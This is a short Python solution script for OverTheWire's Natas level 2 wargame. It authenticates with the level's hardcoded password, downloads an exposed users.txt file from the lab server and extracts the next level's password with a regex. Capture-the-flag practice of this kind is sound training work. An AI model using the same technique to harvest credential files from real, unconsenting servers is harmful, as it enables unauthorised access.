import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas2','ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')
def get_pass():
    r = requests.get('http://natas2.natas.labs.overthewire.org/files/users.txt', auth=auth)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[0])
if __name__ == '__main__':
    get_pass()
